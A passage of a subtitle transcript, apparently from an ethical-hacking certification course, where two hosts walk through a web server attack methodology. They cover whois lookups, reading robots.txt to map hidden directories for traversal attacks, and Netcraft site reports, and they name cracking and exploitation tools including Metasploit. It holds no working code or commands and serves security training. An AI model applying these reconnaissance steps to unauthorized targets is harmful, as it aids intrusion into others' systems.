sniffing,\nin our session hijacking discussion.\n\n586\n00:25:10.820 --> 00:25:12.730\nWe did cross that request forgery,\nas well.\n\n587\n00:25:12.730 --> 00:25:15.160\nBut for overflows,\na lot of these are on the list.\n\n588\n00:25:15.160 --> 00:25:16.660\nYou should definitely go\nthrough that whole list.\n\n589\n00:25:16.660 --> 00:25:18.920\nWe're not gonna run through\nthem all again for you now,\n\n590\n00:25:18.920 --> 00:25:20.140\nbecause we've been through that list.\n\n591\n00:25:20.140 --> 00:25:23.690\nAnd Dan, I think a pretty thorough\njob over time going through them all,\n\n592\n00:25:23.690 --> 00:25:25.720\nbut they do cross pollinate and.\n\n593\n00:25:25.720 --> 00:25:27.110\nI wanna make sure we're aware of it.\n\n594\n00:25:27.110 --> 00:25:29.980\nSo Michael, if has not already,\nI see he put it up.\n\n595\n00:25:29.980 --> 00:25:30.780\nSo that's great.\n\n596\n00:25:30.780 --> 00:25:33.200\nDo we have the web server\nattack methodology list?\n\n597\n00:25:33.200 --> 00:25:34.770\nA little word list you put together for\nus.\n\n598\n00:25:34.770 --> 00:25:36.140\n&gt;&gt; We do, we do.\n&gt;&gt; I think we're gonna put that up.\n\n599\n00:25:36.140 --> 00:25:40.050\nWe have a nice little six-step methodology\nthat we put together here for you.\n\n600\n00:25:40.050 --> 00:25:41.530\nWe wanna make sure you're aware of this.\n\n601\n00:25:41.530 --> 00:25:42.160\nAgain remember,\n\n602\n00:25:42.160 --> 00:25:45.410\nany time you see a numbered list,\nwe'd go to the trouble putting it up.\n\n603\n00:25:45.410 --> 00:25:49.090\nPretty important to make sure we take\nnote of this to prepare for the exam.\n\n604\n00:25:49.090 --> 00:25:51.610\nWe wanna make sure we have\na sense of the methodologies.\n\n605\n00:25:51.610 --> 00:25:54.800\nThose were always popular items to\njust make sure we're comfortable with.\n\n606\n00:25:54.800 --> 00:25:56.680\nWe'll delve in a little bit\non each one of these and\n\n607\n00:25:56.680 --> 00:25:57.970\ntalk about some things that go on.\n\n608\n00:25:57.970 --> 00:26:00.730\nWe've got some websites and tools and\nthings we're gonna take a look at.\n\n609\n00:26:00.730 --> 00:26:06.470\nSo information gathering web server\nfoot printing mirroring of web sites.\n\n610\n00:26:06.470 --> 00:26:10.840\nVulnerability scanning, session hijacking\nhacking of web server passwords.\n\n611\n00:26:10.840 --> 00:26:13.200\nWe've talked about every one\nof these things in one form or\n\n612\n00:26:13.200 --> 00:26:17.180\nanother, done demos on quite a few\nof them, recon and foot printing for\n\n613\n00:26:17.180 --> 00:26:20.960\ninstance, talked a lot about\nthat mirroring a website.\n\n614\n00:26:20.960 --> 00:26:23.980\nWe've actually gone and showed you\nhow to take a website and mirror it.\n\n615\n00:26:23.980 --> 00:26:27.020\nI've actually done a demo on that\nin one of the earlier episodes.\n\n616\n00:26:27.020 --> 00:26:29.730\nVulnerability scanning,\nwe're taking a look at that.\n\n617\n00:26:29.730 --> 00:26:33.450\nSession hijacking, we did some stuff on\nthat, and we actually showed you how to go\n\n618\n00:26:33.450 --> 00:26:37.340\nin, and set up and do a session hijack,\nso we've done that.\n\n619\n00:26:37.340 --> 00:26:38.640\nHacking webserver passwords,\n\n620\n00:26:38.640 --> 00:26:41.550\nI think that one we probably haven't\ndone Is a demo on password hacking.\n\n621\n00:26:41.550 --> 00:26:43.380\nIn terms of just cracking passwords.\n\n622\n00:26:43.380 --> 00:26:46.610\nBut it's obviously something\nthat takes a lot of time,\n\n623\n00:26:46.610 --> 00:26:48.130\nwhich is one of the reasons\nwe don't demo it.\n\n624\n00:26:48.130 --> 00:26:50.924\nBecause we could set it up and\nthen come back in like 100 years.\n\n625\n00:26:50.924 --> 00:26:52.520\n[LAUGH] And then most likely,\n\n626\n00:26:52.520 --> 00:26:55.300\nit would be ready depending on\nthe nature of the password.\n\n627\n00:26:55.300 --> 00:26:57.180\nAnd I'm willing to commit\nto doing that by the way.\n\n628\n00:26:57.180 --> 00:26:58.550\nI don't know about you.\n\n629\n00:26:58.550 --> 00:27:01.000\nBut I could free up time in\nmy calendar in 100 years.\n\n630\n00:27:01.000 --> 00:27:02.140\nI think I could make that work.\n\n631\n00:27:02.140 --> 00:27:04.460\nI'm very booked until like 95 years out.\n\n632\n00:27:04.460 --> 00:27:05.990\n&gt;&gt; Okay.\n&gt;&gt; But after that, it opens up.\n\n633\n00:27:05.990 --> 00:27:06.930\n&gt;&gt; Good.\nIt's pretty high.\n\n634\n00:27:06.930 --> 00:27:08.940\n&gt;&gt; I'm good for like the last five.\n\n635\n00:27:08.940 --> 00:27:10.860\nThe next 95 are kinda bit–\n&gt;&gt; And we'll work that out.\n\n636\n00:27:10.860 --> 00:27:11.360\n&gt;&gt; Yeah, yeah.\n\n637\n00:27:11.360 --> 00:27:13.030\nWe gotta figure that out.\n\n638\n00:27:13.030 --> 00:27:14.068\nIt's booking quickly.\n\n639\n00:27:14.068 --> 00:27:15.740\n&gt;&gt; [LAUGH]\n&gt;&gt; I'm [INAUDIBLE] up very quickly.\n\n640\n00:27:15.740 --> 00:27:18.660\nThere's a lot of stuff going on there.\n\n641\n00:27:18.660 --> 00:27:23.580\nWe don't demo that,\nonly because it is does actually,\n\n642\n00:27:23.580 --> 00:27:26.550\neven with a simple password,\nit takes a little bit of time.\n\n643\n00:27:26.550 --> 00:27:27.925\nI mean, it's like 1 2 3, right?\n\n644\n00:27:27.925 --> 00:27:30.460\n&gt;&gt; Mm-hm.\n&gt;&gt; It takes time and it takes so\n\n645\n00:27:30.460 --> 00:27:34.760\nmuch time that it's really hard to demo\ninto a realistic amount of time in\n\n646\n00:27:34.760 --> 00:27:37.460\none of our episodes but\n&gt;&gt; It's something you certainly could go\n\n647\n00:27:37.460 --> 00:27:38.190\nand do on your own.\n\n648\n00:27:38.190 --> 00:27:41.350\nEncourage you to download the software,\nplay around with it.\n\n649\n00:27:41.350 --> 00:27:43.800\nHere's a lot of cool stuff\nyou can do there, but\n\n650\n00:27:43.800 --> 00:27:46.080\nit's something you gotta pretty\nmuch take on on your own and do.\n\n651\n00:27:46.080 --> 00:27:48.110\nLet's talk about information\ngathering a little bit.\n\n652\n00:27:48.110 --> 00:27:49.580\nAll right, let's go and let's just know.\n\n653\n00:27:49.580 --> 00:27:51.890\nWe're gonna do a little show and tell\n&gt;&gt; Yeah.\n\n654\n00:27:51.890 --> 00:27:55.460\n&gt;&gt; Web surfing as they say in\nthe web server hacking area.\n\n655\n00:27:55.460 --> 00:27:56.880\nCan you go to whois.net for me?\n\n656\n00:27:56.880 --> 00:27:57.440\n&gt;&gt; I can.\n\n657\n00:27:57.440 --> 00:27:58.480\n&gt;&gt; Let's just go to whois.net and\n\n658\n00:27:58.480 --> 00:28:00.210\nwe'll talk about robots\nthere in a couple minutes.\n\n659\n00:28:00.210 --> 00:28:01.660\n&gt;&gt; Just go to whois.net for a minute.\n\n660\n00:28:01.660 --> 00:28:04.590\nSo one of the ways that we can do\na little information gathering\n\n661\n00:28:04.590 --> 00:28:06.110\nis by doing some lookups right.\n\n662\n00:28:06.110 --> 00:28:11.140\nSo we could go in and see whose domain\nregistration is controlled by or\n\n663\n00:28:11.140 --> 00:28:13.240\nwho a domain registration\nis controlled by.\n\n664\n00:28:13.240 --> 00:28:14.710\nAnd we can obviously get information.\n\n665\n00:28:14.710 --> 00:28:19.500\nIt may tell us admin contacts, IT\nprofessionals, addresses, phone numbers.\n\n666\n00:28:19.500 --> 00:28:20.870\nExcuse me, things like that.\n\n667\n00:28:20.870 --> 00:28:24.520\nWe could use Traceroute, we could\nuse ActiveWhois, we could go out and\n\n668\n00:28:24.520 --> 00:28:26.890\nwe could use LinkedIn,\nwe can use Facebook.\n\n669\n00:28:26.890 --> 00:28:30.310\nWe can do all sorts of stuff not just to\nlook up who their name registration is,\n\n670\n00:28:30.310 --> 00:28:32.370\ncuz you don't do that\nacross all those sites.\n\n671\n00:28:32.370 --> 00:28:35.790\nBut you could begin to build the pictures\nwe talked about in recon, and\n\n672\n00:28:35.790 --> 00:28:39.250\nfingerprinting, and social engineering,\nanother one of the episodes\n\n673\n00:28:39.250 --> 00:28:42.450\nthat we spoke a lot about this in,\nand we demoed some of these things.\n\n674\n00:28:42.450 --> 00:28:46.620\nBut trying to stitch that knowledge back\ntogether here, helping us to focus in on\n\n675\n00:28:46.620 --> 00:28:49.240\n&gt;&gt; The initial stages of what we need to\n\n676\n00:28:49.240 --> 00:28:51.490\nthink about doing or accomplishing here.\n\n677\n00:28:51.490 --> 00:28:53.220\nWell, no we actually wanna,\nno we are gonna stay there.\n\n678\n00:28:53.220 --> 00:28:55.750\nWe're gonna be doing some stuff there for\nthe next couple of minutes.\n\n679\n00:28:55.750 --> 00:28:56.810\n&gt;&gt; Okay.\n&gt;&gt; Let's go back up there.\n\n680\n00:28:56.810 --> 00:28:58.690\nIt's not the first we're gonna go to, but\n\n681\n00:28:58.690 --> 00:29:01.420\nwe just wanna make sure that we\nunderstand of information gathering,\n\n682\n00:29:02.580 --> 00:29:06.550\nthat it's gonna be really critical for us\nto be able to go out, and start chipping\n\n683\n00:29:06.550 --> 00:29:10.390\naway at that block of information we\nneed to gather to figure stuff out.\n\n684\n00:29:10.390 --> 00:29:13.130\nI mentioned the robots trick, so\nlet's take a lot at the robot.\n\n685\n00:29:13.130 --> 00:29:14.510\nI know you have the site up.\n\n686\n00:29:14.510 --> 00:29:17.230\nSo, you know, one of the interesting\nthings that people don't realize about\n\n687\n00:29:17.230 --> 00:29:21.960\nsites, is that we have an ability to\nleverage an existing technology, and\n\n688\n00:29:21.960 --> 00:29:25.540\nprotection mechanism to actually\ndo information gathering, right?\n\n689\n00:29:25.540 --> 00:29:29.000\nSo we have a file on many websites\ncalled the robots.txt file,\n\n690\n00:29:29.000 --> 00:29:30.390\nthe robots dot text file.\n\n691\n00:29:30.390 --> 00:29:33.340\nAnd this file is a list of all\nthe web server directories and files,\n\n692\n00:29:33.340 --> 00:29:37.080\nthat the website owner typically wants\nto hide from crawlers from web bots,\n\n693\n00:29:37.080 --> 00:29:40.550\nthat are going out trying to spider\nthe site and load it all up, and\n\n694\n00:29:40.550 --> 00:29:42.470\ncache it, and expose it.\n\n695\n00:29:42.470 --> 00:29:47.070\nSo if we know the file exists and we go\nand request it, we're gonna to get a list\n\n696\n00:29:47.070 --> 00:29:50.479\nof all the files of the directories\nthat nobody is suppose to see.\n\n697\n00:29:50.479 --> 00:29:51.650\n&gt;&gt; [LAUGH]\n&gt;&gt; And so\n\n698\n00:29:51.650 --> 00:29:56.160\nby claiming them and hiding them,\nyou know, trying to hide them rather.\n\n699\n00:29:56.160 --> 00:30:00.445\nBut claiming them by declaring them,\nwe actually are exposing them.\n\n700\n00:30:00.445 --> 00:30:05.299\n[CROSSTALK] You make a list of this,\nand this is actually now\n\n701\n00:30:05.299 --> 00:30:10.270\ngoing to allow the website owner to say,\nhey, off limits.\n\n702\n00:30:10.270 --> 00:30:14.226\nAnd through the robot's exclusion protocol\nwhich is essentially what this is,\n\n703\n00:30:14.226 --> 00:30:17.484\nwe actually create slow text file but\nyou can download this file and\n\n704\n00:30:17.484 --> 00:30:19.960\nyou can actually get it\nfrom the web server.\n\n705\n00:30:19.960 --> 00:30:24.465\nAnd so if you get, it gives us potentially\na heads up, help us to maybe, have a go in\n\n706\n00:30:24.465 --> 00:30:28.695\nand actually, start now we have a road\nmap for a dot dot slash attack.\n\n707\n00:30:28.695 --> 00:30:32.755\nRight, because we can now go out and skid\ndirectly to reversal attack looking for\n\n708\n00:30:32.755 --> 00:30:33.565\nthese directories.\n\n709\n00:30:33.565 --> 00:30:35.510\nSo, this would let us link this up.\n\n710\n00:30:35.510 --> 00:30:38.800\nYeah so it's kinda cool so this is\njust something to pay attention too if\n\n711\n00:30:38.800 --> 00:30:42.080\nyou wanna learn more about it, read\nabout it, legitimately how it's setup,\n\n712\n00:30:42.080 --> 00:30:44.110\nwhat it's used for we've got the URL.\n\n713\n00:30:44.110 --> 00:30:47.070\nMichael post that for you it's one of\nthese things you can read through it\n\n714\n00:30:47.070 --> 00:30:49.540\nlike five, ten minutes it's not\nreally hard to figure it out for all.\n\n715\n00:30:49.540 --> 00:30:51.390\nIt's really cool and it is,\n\n716\n00:30:51.390 --> 00:30:55.000\nit's a standard thing that many\nwebsites in the world do today.\n\n717\n00:30:55.000 --> 00:30:59.640\nBut again, we can take that information\nand we can leverage it as an attacker.\n\n718\n00:30:59.640 --> 00:31:04.370\nWhat we're looking for are ways, in which\ncommon protective measures are implemented\n\n719\n00:31:04.370 --> 00:31:06.950\nthat we can then use to our\nadvantages as hackers, and\n\n720\n00:31:06.950 --> 00:31:08.720\nthen obviously as ethical hackers.\n\n721\n00:31:08.720 --> 00:31:11.190\nWe have to understand that and\ntry to turn that around.\n\n722\n00:31:11.190 --> 00:31:11.770\nRight?\n\n723\n00:31:11.770 --> 00:31:13.110\nSo that's something to consider.\n\n724\n00:31:13.110 --> 00:31:14.120\nSo I see your highlighting.\n\n725\n00:31:14.120 --> 00:31:16.790\n&gt;&gt; I don't know if we can if we can\n&gt;&gt; Not while am still on\n\n726\n00:31:16.790 --> 00:31:17.540\nthe screen you can't no.\n\n727\n00:31:17.540 --> 00:31:20.300\n&gt;&gt; But there is a note right\nthere just reiterating\n\n728\n00:31:20.300 --> 00:31:21.200\n&gt;&gt; What Adam is saying,\n\n729\n00:31:21.200 --> 00:31:23.270\nthe robots.txt file is\na publicly available.\n\n730\n00:31:23.270 --> 00:31:24.510\n&gt;&gt; Publicly available file.\n\n731\n00:31:24.510 --> 00:31:28.880\nAnyone can see what sections of your\nserver you don't want the robots to use.\n\n732\n00:31:28.880 --> 00:31:30.950\nSo it's almost like you\nmade this decision,\n\n733\n00:31:30.950 --> 00:31:35.700\nyou want to make a list to keep the robots\nout but then tell everybody, [LAUGH].\n\n734\n00:31:35.700 --> 00:31:37.810\nOr just let the robots hit it,\nnot have a list and\n\n735\n00:31:37.810 --> 00:31:40.150\nhopefully not Tell\neverybody about it yeah.\n\n736\n00:31:40.150 --> 00:31:41.330\n&gt;&gt; Yeah it's one of those things.\n\n737\n00:31:41.330 --> 00:31:42.100\nRight you gotta go\n&gt;&gt; Yeah.\n\n738\n00:31:42.100 --> 00:31:43.700\n&gt;&gt; you know you gotta kind of go back and\nforth and\n\n739\n00:31:43.700 --> 00:31:45.810\ndecide which side you error on here right?\n\n740\n00:31:45.810 --> 00:31:47.460\n&gt;&gt; Yep.\n&gt;&gt; If you don't tell people\n\n741\n00:31:47.460 --> 00:31:49.430\nstay away from the stuff\nit does get exposed.\n\n742\n00:31:49.430 --> 00:31:50.690\n&gt;&gt; If you just crawl open that\n&gt;&gt; But if you tell people.\n\n743\n00:31:50.690 --> 00:31:51.740\n&gt;&gt; Shows up in search engines yeah.\n\n744\n00:31:51.740 --> 00:31:53.790\n&gt;&gt; Right if you tell people\nstay away then it gets\n\n745\n00:31:53.790 --> 00:31:55.280\n&gt;&gt; Exposed anyway because hackers come and\n\n746\n00:31:55.280 --> 00:31:59.090\nsay well have I got a solution for\nyou right.\n\n747\n00:31:59.090 --> 00:32:00.620\nSo that's something to consider so\n\n748\n00:32:00.620 --> 00:32:04.900\nthat's why I'm gonna give up and\nmove to I don't know.\n\n749\n00:32:04.900 --> 00:32:05.713\n&gt;&gt; The inter web.\n\n750\n00:32:05.713 --> 00:32:08.495\n&gt;&gt; Move to I don't know what, but\n\n751\n00:32:08.495 --> 00:32:13.104\njust something to just not\nuse it at all exactly so.\n\n752\n00:32:13.104 --> 00:32:14.149\nIt's just something to think about.\n\n753\n00:32:14.149 --> 00:32:15.084\nBut I always find that one,\n\n754\n00:32:15.084 --> 00:32:18.290\nit's kind of interesting because a lot\nof people don't realize that's going on.\n\n755\n00:32:18.290 --> 00:32:20.759\nI mean if you're in the web server\nbusiness, you're setting up websites,\n\n756\n00:32:20.759 --> 00:32:21.965\nyeah, clearly you know about that.\n\n757\n00:32:21.965 --> 00:32:24.609\nBut I find that when I mention\nit in class a lot of times or\n\n758\n00:32:24.609 --> 00:32:27.888\nI talk to customers about it,\na lot of them don't realize that.\n\n759\n00:32:27.888 --> 00:32:30.270\nI say well, by the way,\ndid you know you're hiding these or\n\n760\n00:32:30.270 --> 00:32:31.780\ntrying to stealth these 20 directories.\n\n761\n00:32:31.780 --> 00:32:33.110\nThey're like well, how did you know that?\n\n762\n00:32:33.110 --> 00:32:35.130\nI said well, all I did was go here and\nget this file.\n\n763\n00:32:35.130 --> 00:32:36.728\nI mean everybody in\nthe world knows about it.\n\n764\n00:32:36.728 --> 00:32:38.980\n&gt;&gt; [LAUGH]\n&gt;&gt; In theory, except for you, right?\n\n765\n00:32:38.980 --> 00:32:41.000\n&gt;&gt; Yeah [LAUGH].\n&gt;&gt; So apparently everybody,\n\n766\n00:32:41.000 --> 00:32:43.980\nwe threw a party, nobody invited you and\nthat's how we all found out.\n\n767\n00:32:43.980 --> 00:32:46.190\nYeah, and then you feel bad,\nbut only for a minute.\n\n768\n00:32:46.190 --> 00:32:48.730\nThen you're like yeah,\nit sucks to be you and you move on.\n\n769\n00:32:48.730 --> 00:32:51.570\nSo just keep in mind that that's\nsomething that may happen out there.\n\n770\n00:32:51.570 --> 00:32:54.050\nIf you are aware, great,\nif not, something to know about.\n\n771\n00:32:54.050 --> 00:32:55.746\nI did ask you to bring up Netcraft,\nI know.\n\n772\n00:32:55.746 --> 00:32:56.249\n&gt;&gt; I did.\n\n773\n00:32:56.249 --> 00:32:57.839\n&gt;&gt; And so\nanother way that we can go out and\n\n774\n00:32:57.839 --> 00:33:01.620\ndo web server footprinting is to go\nto Netcraft, you can see it there.\n\n775\n00:33:01.620 --> 00:33:06.700\nWe got a lot of valuable data from the\nwebsite by using something like Webcraft,\n\n776\n00:33:06.700 --> 00:33:07.330\nI was gonna say.\n\n777\n00:33:07.330 --> 00:33:09.360\nBy using Webcraft on Netcraft.\n\n778\n00:33:09.360 --> 00:33:09.860\n&gt;&gt; [LAUGH]\n&gt;&gt; Right?\n\n779\n00:33:09.860 --> 00:33:10.947\nSo on Netcraft, we can go in,\n\n780\n00:33:10.947 --> 00:33:13.516\ncan you pull up a site, do a quick\nsearch maybe over there on the right?\n\n781\n00:33:13.516 --> 00:33:14.853\n&gt;&gt; I'm not sure, let's see.\n\n782\n00:33:14.853 --> 00:33:15.790\n&gt;&gt; I don't know.\n\n783\n00:33:15.790 --> 00:33:16.353\n&gt;&gt; Where are we\n\n784\n00:33:16.353 --> 00:33:17.200\nat?\n&gt;&gt; Down there.\n\n785\n00:33:17.200 --> 00:33:18.570\nWhat's the site running right there?\n\n786\n00:33:18.570 --> 00:33:20.130\nYeah, yeah, there you go.\n\n787\n00:33:20.130 --> 00:33:23.237\n&gt;&gt; I don't know which one you wanna do,\nwhatever it is, but yeah.\n\n788\n00:33:23.237 --> 00:33:24.352\n&gt;&gt; Ooh, full of itpro.tv.\n\n789\n00:33:24.352 --> 00:33:25.600\n&gt;&gt; Yeah, whichever one, no problem.\n\n790\n00:33:25.600 --> 00:33:26.630\nBut what it'll show you,\n\n791\n00:33:26.630 --> 00:33:30.000\njust as Mike brings it up,\nit shows you the results for whatever.\n\n792\n00:33:30.000 --> 00:33:32.970\nIn this case for itpro.tv,\nshows you what's running.\n\n793\n00:33:32.970 --> 00:33:36.850\nSo it looks like,\na known OS is on the most recent one.\n\n794\n00:33:36.850 --> 00:33:39.098\nOr no, the earliest one and then Linux\non the last two, it looks like, right?\n\n795\n00:33:39.098 --> 00:33:40.217\n&gt;&gt; Yeah.\n\n796\n00:33:40.217 --> 00:33:41.037\n&gt;&gt; Yeah.\n\n797\n00:33:41.037 --> 00:33:43.619\nGo in and do ec-counsel.org.\n\n798\n00:33:43.619 --> 00:33:45.787\n&gt;&gt; All right.\n&gt;&gt; Ec-counsel.org.\n\n799\n00:33:45.787 --> 00:33:49.303\nLet's see what they're running.\n\n800\n00:33:49.303 --> 00:33:51.433\nWe could do whitehouse.net.\n\n801\n00:33:51.433 --> 00:33:56.360\n&gt;&gt; [LAUGH] No, unknown,\nthey got a blocked isolate, it looks like.\n\n802\n00:33:57.890 --> 00:33:59.130\n&gt;&gt; As of what?\n\n803\n00:33:59.130 --> 00:34:03.474\n&gt;&gt; First seen in 2004,\nso we click Site Report.\n\n804\n00:34:03.474 --> 00:34:04.812\n&gt;&gt; Okay, well, we could.\n\n805\n00:34:04.812 --> 00:34:07.518\n&gt;&gt; Kind of info we get here.\n\n806\n00:34:07.518 --> 00:34:08.706\n&gt;&gt; Let's see what's going on there.\n\n807\n00:34:08.706 --> 00:34:09.325\nSo what do you got there?\n\n808\n00:34:09.325 --> 00:34:14.110\nA little background, got the website URL,\ngot the address obviously, right?\n\n809\n00:34:14.110 --> 00:34:19.696\nGot the the main information,\nunknown OS and\n\n810\n00:34:19.696 --> 00:34:23.670\nhosting country in CH, right?\n\n811\n00:34:23.670 --> 00:34:24.210\nWhere is that?\n\n812\n00:34:24.210 --> 00:34:26.290\nIs that Czechoslovakia?\n\n813\n00:34:26.290 --> 00:34:26.960\nWhere is that?\n\n814\n00:34:26.960 --> 00:34:29.060\nI can't see the flags,\nI don't know what country that is.\n\n815\n00:34:29.060 --> 00:34:30.140\n&gt;&gt; It looks like it's.\n\n816\n00:34:31.660 --> 00:34:35.870\nSo, World FactBook Switzerland.\n\n817\n00:34:35.870 --> 00:34:37.910\n&gt;&gt; Switzerland, okay, yeah.\n\n818\n00:34:37.910 --> 00:34:39.520\nIt's great that the CIA website came up.\n\n819\n00:34:39.520 --> 00:34:40.768\nSo they've loaded the malware on your\n\n820\n00:34:40.768 --> 00:34:41.282\ncomputer\n&gt;&gt; [LAUGH]\n\n821\n00:34:41.282 --> 00:34:42.490\n&gt;&gt; Now you can track anywhere in\n\n822\n00:34:42.490 --> 00:34:44.866\nthe world,\nthat’s exactly why that happens, right?\n\n823\n00:34:44.866 --> 00:34:48.028\nSo you could see [CROSSTALK]\nthe net block owner, right?\n\n824\n00:34:48.028 --> 00:34:51.493\nSo you could see there that the net\nblock owner for the net scaler and for\n\n825\n00:34:51.493 --> 00:34:52.680\nthe devices are using.\n\n826\n00:34:52.680 --> 00:34:56.478\nSo we could obviously see some information\nabout their architecture outside on\n\n827\n00:34:56.478 --> 00:34:59.530\nthe periphery in terms of\nhow they're scaling, right?\n\n828\n00:34:59.530 --> 00:35:01.400\nSo that's good to know and yes, so there.\n\n829\n00:35:01.400 --> 00:35:02.560\nYes, so it's got some mentioned stuff.\n\n830\n00:35:02.560 --> 00:35:04.100\nYou got the SPF information there for\n\n831\n00:35:04.100 --> 00:35:07.840\ncenter policy framework,\nwe got web trackers.\n\n832\n00:35:07.840 --> 00:35:09.310\nSo we got some information.\n\n833\n00:35:09.310 --> 00:35:10.950\nSo the cyber reports\nare actually pretty cool.\n\n834\n00:35:10.950 --> 00:35:12.140\nRight, they tell us a lot of stuff.\n\n835\n00:35:12.140 --> 00:35:15.600\nSo again as a bad actor,\nthat would be helpful.\n\n836\n00:35:15.600 --> 00:35:19.270\nAll sorts of different tools\nwe may use to accomplish this.\n\n837\n00:35:19.270 --> 00:35:20.950\nWe're just showing you\nsome of the common ones.\n\n838\n00:35:20.950 --> 00:35:23.940\nThere's HTTP Recon, there's ID Serve,\n\n839\n00:35:23.940 --> 00:35:25.790\nthese are just some tools\nthat are out there.\n\n840\n00:35:25.790 --> 00:35:28.270\nWe can use Nmap, of course,\nan oldie but a goodie.\n\n841\n00:35:28.270 --> 00:35:31.760\nWe've taken a look at Nmap and\nsome of the other things we've done.\n\n842\n00:35:31.760 --> 00:35:33.570\nHT Track,\n\n843\n00:35:33.570 --> 00:35:38.230\nwhich is a website mirroring tool that\nI demoed in one of the early episodes.\n\n844\n00:35:38.230 --> 00:35:39.235\nYou could take a look at that.\n\n845\n00:35:39.235 --> 00:35:42.480\nWe actually pulled down the website and\nmirrored a bunch of stuff.\n\n846\n00:35:42.480 --> 00:35:45.810\nWent into some of that Facebook hacking\nand things like that if you remember,\n\n847\n00:35:45.810 --> 00:35:46.590\nwe did some of that.\n\n848\n00:35:46.590 --> 00:35:49.710\nSo we did vulnerability scanning,\nright, apps to go in and\n\n849\n00:35:49.710 --> 00:35:52.970\ntake a look at vulnerability scanners and\nsee what may be going on.\n\n850\n00:35:52.970 --> 00:35:56.949\nWe did session hijacking and\nwe could go in and we could.\n\n851\n00:35:58.780 --> 00:36:02.530\nAs we've taken a look at, actually try\nto hijack the session interactively or\n\n852\n00:36:02.530 --> 00:36:03.812\npassively monitoring.\n\n853\n00:36:03.812 --> 00:36:05.890\nThings like,and I know I've\nmentioned this before, but\n\n854\n00:36:05.890 --> 00:36:08.750\nFiresheep, Burp Suite, J Hijack.\n\n855\n00:36:08.750 --> 00:36:11.198\nThese are tools that\ntraditionally get used there.\n\n856\n00:36:11.198 --> 00:36:14.517\nThere's a portswigger.net,\nthat's another one that they got,\n\n857\n00:36:14.517 --> 00:36:16.770\nthat's a tool that's kind of cool.\n\n858\n00:36:16.770 --> 00:36:19.870\nHacking web passwords, we've talked\nabout hacking passwords in general.\n\n859\n00:36:19.870 --> 00:36:22.740\nAnd going in and\ndealing with some of the tools.\n\n860\n00:36:22.740 --> 00:36:26.858\nI keep mentioning them, I don't know if\nyou've thrown them up, but pwdump and\n\n861\n00:36:26.858 --> 00:36:27.476\npwdump2.\n\n862\n00:36:27.476 --> 00:36:28.384\n&gt;&gt; Like we did [CROSSTALK].\n\n863\n00:36:28.384 --> 00:36:30.575\n&gt;&gt; I think I said Jack\nthe Ripper by mistake last time.\n\n864\n00:36:30.575 --> 00:36:33.021\nBut John the Ripper, any of those.\n\n865\n00:36:33.021 --> 00:36:35.030\nLove crack obviously as you know.\n\n866\n00:36:35.030 --> 00:36:38.520\nThere's metasploid, it's a hacking\nframework overall which is valuable for\n\n867\n00:36:38.520 --> 00:36:40.030\nall sorts of stuff.\n\n868\n00:36:40.030 --> 00:36:41.702\nCan you bring up the metasploit\nwebsite without getting into trouble?\n\n869\n00:36:41.702 --> 00:36:43.344\n&gt;&gt; Absolutely.\n\n870\n00:36:43.344 --> 00:36:45.368\n&gt;&gt; We can probably do that in a minute,\nwe'll let you throw that up there.\n\n871\n00:36:45.368 --> 00:36:48.850\nBut metasploit's probably one of the most\npopular frameworks out there today.\n\n872\n00:36:48.850 --> 00:36:53.410\nYou've seen me use it in some of the Linux\nbased demos we've done to set up attack\n\n873\n00:36:53.410 --> 00:36:55.560\nsystems and to run a variety of things.\n\n874\n00:36:55.560 --> 00:36:58.850\nI created that attack APK file,\nthe backdoor.apk for\n\n875\n00:36:58.850 --> 00:37:01.550\nthe mobile hacking episode that we did.\n\n876\n00:37:01.550 --> 00:37:03.602\nAnd you were able to see me use it there.\n\n877\n00:37:03.602 --> 00:37:08.620\nYeah, so\npen testing software on a massive scale.\n\n878\n00:37:08.620 --> 00:37:11.130\nAnd made up of a lot of different modules.\n\n879\n00:37:11.130 --> 00:37:14.150\nGot the exploit module,\nyou got the payload module in there,\n\n880\n00:37:14.150 --> 00:37:18.770\nyou got the auxillary module, let's\nyou do all sorts of additional stuff.\n\n881\n00:37:18.770 --> 00:37:22.900\nThere's the nops module that generates\nno operation instructions to block out\n\n882\n00:37:22.900 --> 00:37:23.498\nput buffers.\n\n883\n00:37:23.498 --> 00:37:28.010\nOr block out, blocking out buffers\nrather is what I meant to say and\n\n884\n00:37:28.010 --> 00:37:33.200\nto try to execute a bunch of different\nattacks and generate interesting outcomes.\n\n885\n00:37:33.200 --> 00:37:35.450\nIt's a very versatile platform and tool.\n\n886\n00:37:35.450 --> 00:37:37.210\nI remember when this thing\nwas first starting out and\n\n887\n00:37:37.210 --> 00:37:41.190\nthis was just kind of really underground\nbackdoor code that nobody knew about.\n\n888\n00:37:41.190 --> 00:37:45.050\nAnd then it became this huge commercial,\nhey, let's go buy it and\n\n889\n00:37:45.050 --> 00:37:47.290\nactually make it viable kind of thing.\n\n890\n00:37:47.290 --> 00:37:50.615\nAnd that's actually what we need to do,\nwe need to take,\n\n891\n00:37:50.615 --> 00:37:54.910\nsnow spotter and\ncreate it as a hacking platform.\n\n892\n00:37:54.910 --> 00:37:58.850\nAnd biometric authentication\nall in one and\n\n893\n00:37:58.850 --> 00:38:02.210\nthen get somebody like a rich\nVC investor to buy us out.\n\n894\n00:38:02.210 --> 00:38:05.815\n&gt;&gt; We could get on Shark Tank maybe and\n&gt;&gt; No, I don't like them,\n\n895\n00:38:05.815 --> 00:38:08.840\ncuz all they're focused on is\njust money and I'm in it just for\n\n896\n00:38:08.840 --> 00:38:13.107\nthe actual, not the money, but\njust to say cool stuff like Snow Spotter.\n\n897\n00:38:13.107 --> 00:38:14.720\n&gt;&gt; Okay [LAUGH].\n&gt;&gt; That's all I wanna do.\n\n898\n00:38:14.720 --> 00:38:15.878\n&gt;&gt; Great,\nthen I'll take all the profits and-\n\n899\n00:38:15.878 --> 00:38:16.704\n&gt;&gt; You go do all that, I just want to come\n\n900\n00:38:16.704 --> 00:38:17.243\nup with the cool names.\n\n901\n00:38:17.243 --> 00:38:18.470\n&gt;&gt; You just have the bumper sticker.\n\n902\n00:38:18.470 --> 00:38:19.211\n&gt;&gt; Yeah, I just want the bumper sticker.\n\n903\n00:38:19.211 --> 00:38:21.705\n&gt;&gt; [LAUGH]\n&gt;&gt; That's all, that's what I'm in it for.\n\n904\n00:38:21.705 --> 00:38:23.276\nI'm a purist, right?\n\n905\n00:38:23.276 --> 00:38:27.286\nMoney means nothing,\nit's all about the activity.\n\n906\n00:38:27.286 --> 00:38:32.470\nSo things like WFetch, another tool that\nlets us do a lot of this kind of stuff.\n\n907\n00:38:32.470 --> 00:38:37.230\nWhere we can essentially interact with and\ncreate packets back and forth.\n\n908\n00:38:37.230 --> 